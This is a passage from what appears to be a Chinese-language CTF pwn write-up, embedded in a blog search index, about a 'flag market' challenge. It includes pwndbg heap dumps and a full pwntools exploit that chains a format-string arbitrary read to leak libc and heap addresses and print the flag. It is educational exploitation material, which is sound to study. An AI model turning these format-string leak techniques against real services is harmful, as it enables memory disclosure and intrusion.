class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x405290</span><br><span class="line">Size: 0x1e0 (with flag bits: 0x1e1)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x405470</span><br><span class="line">Size: 0x1010 (with flag bits: 0x1011)</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x406480</span><br><span class="line">Size: 0x1fb80 (with flag bits: 0x1fb81)</span><br><span class="line"></span><br><span class="line">pwndbg&gt; telescope 0x405000 0x500</span><br><span class="line">00:0000│      0x405000 ◂— 0</span><br><span class="line">01:0008│      0x405008 ◂— 0x291</span><br><span class="line">02:0010│      0x405010 ◂— 0</span><br><span class="line">... ↓         80 skipped</span><br><span class="line">53:0298│      0x405298 ◂— 0x1e1</span><br><span class="line">54:02a0│      0x4052a0 ◂— 0xfbad2488</span><br><span class="line">55:02a8│      0x4052a8 —▸ 0x4054ab ◂— 0</span><br><span class="line">56:02b0│      0x4052b0 —▸ 0x4054ab ◂— 0</span><br><span class="line">57:02b8│      0x4052b8 —▸ 0x405480 ◂— <span class="string">&#x27;flag&#123;0ec285cb-c1b3-49ff-820b-8075a639bc1e&#125;\n&#x27;</span></span><br><span class="line">... ↓         4 skipped</span><br><span class="line">5c:02e0│      0x4052e0 —▸ 0x406480 ◂— 0</span><br><span class="line">5d:02e8│      0x4052e8 ◂— 0</span><br><span class="line">... ↓         3 skipped</span><br><span class="line">61:0308│      0x405308 —▸ 0x7ffff7e044e0 (_IO_2_1_stderr_) ◂— 0xfbad2087</span><br><span class="line">62:0310│      0x405310 ◂— 3</span><br><span class="line">63:0318│      0x405318 ◂— 0</span><br><span class="line">64:0320│      0x405320 ◂— 0</span><br><span class="line">65:0328│      0x405328 —▸ 0x405380 ◂— 0</span><br><span class="line">66:0330│      0x405330 ◂— 0xffffffffffffffff</span><br><span class="line">67:0338│      0x405338 ◂— 0</span><br><span class="line">68:0340│      0x405340 —▸ 0x405390 ◂— 0</span><br><span class="line">69:0348│      0x405348 ◂— 0</span><br><span class="line">... ↓         2 skipped</span><br><span class="line">6c:0360│      0x405360 ◂— 0xffffffff</span><br><span class="line">6d:0368│      0x405368 ◂— 0</span><br><span class="line">6e:0370│      0x405370 ◂— 0</span><br><span class="line">6f:0378│      0x405378 —▸ 0x7ffff7e02030 (_IO_file_jumps) ◂— 0</span><br><span class="line">70:0380│      0x405380 ◂— 0</span><br><span class="line">... ↓         29 skipped</span><br><span class="line">8e:0470│      0x405470 —▸ 0x7ffff7e02228 (_IO_wfile_jumps) ◂— 0</span><br><span class="line">8f:0478│      0x405478 ◂— 0x1011</span><br><span class="line">90:0480│      0x405480 ◂— <span class="string">&#x27;flag&#123;0ec285cb-c1b3-49ff-820b-8075a639bc1e&#125;\n&#x27;</span></span><br><span class="line">91:0488│      0x405488 ◂— <span class="string">&#x27;285cb-c1b3-49ff-820b-8075a639bc1e&#125;\n&#x27;</span></span><br><span class="line">92:0490│      0x405490 ◂— <span class="string">&#x27;b3-49ff-820b-8075a639bc1e&#125;\n&#x27;</span></span><br><span class="line">93:0498│      0x405498 ◂— <span class="string">&#x27;820b-8075a639bc1e&#125;\n&#x27;</span></span><br><span class="line">94:04a0│      0x4054a0 ◂— <span class="string">&#x27;5a639bc1e&#125;\n&#x27;</span></span><br><span class="line">95:04a8│ r8-3 0x4054a8 ◂— 0xa7d65 /* <span class="string">&#x27;e&#125;\n&#x27;</span> */</span><br><span class="line">96:04b0│      0x4054b0 ◂— 0</span><br><span class="line">... ↓         506 skipped</span><br><span class="line">291:1488│      0x406488 ◂— 0x1fb81</span><br><span class="line">292:1490│      0x406490 ◂— 0</span><br><span class="line">... ↓         621 skipped</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>很明显，最低在<code>0x4052b8</code>就出现了。</p><p>现在，我们就可以通过<code>find</code>命令找到那个指针了：</p><blockquote><p>注意，不要直接找flag所在的位置，要找flag所在的那个chunk的位置，因为指针指向的是chunk的位置而不是flag的位置。</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; find /g <span class="variable">$libc_base</span>,<span class="variable">$libc_base</span>+0x400000,0x405000</span><br><span class="line">0x7ffff7e031e0 &lt;mp_+96&gt;</span><br><span class="line">warning: Unable to access 16000 bytes of target memory at 0x7ffff7e0ed68, halting search.</span><br><span class="line">1 pattern found.</span><br></pre></td></tr></table></figure><p>找到的<code>0x7ffff7e031e0 &lt;mp_+96&gt;</code>是在libc中的，而且我们已经泄露了libc的地址。那么，我们就可以通过格式化字符串漏洞的任意地址读泄露<code>0x7ffff7e031e0</code>中的内容即堆指针。但是，此时泄露出来的信息是chunk的地址，因此，为了准确定位flag，我们还得知道偏移量即<code>0x480</code></p><h3 id="3、最终Poc"><a href="#3、最终Poc" class="headerlink" title="3、最终Poc"></a>3、最终Poc</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = remote(&quot;127.0.0.1&quot;,9999)</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./chall&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">b&#x27;2.exit&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">b&#x27;how much you want to pay?&#x27;</span>,<span class="string">b&#x27;-1&#x27;</span>.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">padding = <span class="number">0x100</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*padding + <span class="string">b&#x27;%13$s#&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># for i in range(1,50):</span></span><br><span class="line"><span class="comment">#     payload += f&#x27;%&#123;i&#125;$p-&#x27;.encode()</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;opened user.log, please report:&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;2.exit&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">b&#x27;how much you want to pay?&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>) + p64(<span class="number">0x404050</span>))</span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line">leak = u64(p.recvuntil(<span class="string">b&#x27;#&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&quot;read_addr:&quot;</span> + <span class="built_in">hex</span>(leak))</span><br><span class="line"></span><br><span class="line">libc_base = leak - <span class="number">0x11ba80</span></span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;libc_base:&quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">b&#x27;2.exit&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">b&#x27;how much you want to pay?&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>) + p64(libc_base+<span class="number">0x2031e0</span>+<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line">heap_addr = u64(p.recvuntil(<span class="string">b&#x27;#&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) &lt;&lt; <span class="number">8</span></span><br><span class="line">success(<span class="string">&quot;heap_addr:&quot;</span> + <span class="built_in">hex</span>(heap_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">b&#x27;2.exit&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">b&#x27;how much you want to pay?&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>) + p64(heap_addr+<span class="number">0x480</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>需要注意的是，我们在动态调试中找到的那个指针：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; telescope 0x7ffff7e031e0</span><br><span class="line">00:0000│     0x7ffff7e031e0 (mp_+96) —▸ 0x405000 ◂— 0</span><br></pre></td></tr></table></figure><p>在小端序中，其最低地址字节是”\x00”，这就会导致我们构造的格式化字符串”%s”直接戛然而止。</p><p>因此，我们可以通过”地址+1”的手段，来跳过该空字符，然后泄露地址完成之后，通过左移1字节（8位）的操作（对应脚本<code>&lt;&lt; 8</code>），实现最低有效位（<code>\x00</code>）的补回。</p><p>最终Poc的执行效果（关键部分）：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[DEBUG] Received 0x82 bytes:</span><br><span class="line">    b<span class="string">&#x27;flag&#123;0ec285cb-c1b3-49ff-820b-8075a639bc1e&#125;\n&#x27;</span></span><br><span class="line">    b<span class="string">&#x27;#welcome to flag market!\n&#x27;</span></span><br><span class="line">    b<span class="string">&#x27;give me money to buy my flag,\n&#x27;</span></span><br><span class="line">    b<span class="string">&#x27;choice: \n&#x27;</span></span><br><span class="line">    b<span class="string">&#x27;1.take my money\n&#x27;</span></span><br><span class="line">    b<span class="string">&#x27;2.exit\n&#x27;</span></span><br><span class="line">flag&#123;0ec285cb-c1b3-49ff-820b-8075a639bc1e&#125;</span><br><span class="line"><span class="comment">#welcome to flag market!</span></span><br><span class="line">give me money to buy my flag,</span><br><span class="line">choice:</span><br><span class="line">1.take my money</span><br><span class="line">2.<span class="built_in">exit</span></span><br></pre></td></tr></table></figure><p>可以看到flag被我们泄露出来了~</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 比赛 </category>
          
          <category> WP </category>
          
          <category> Pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fmt格式化字符串漏洞 </tag>
            
            <tag> 任意地址读取 </tag>
            
            <tag> 泄露libc基址 </tag>
            
            <tag> IO_FILE </tag>
            
            <tag> 堆 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
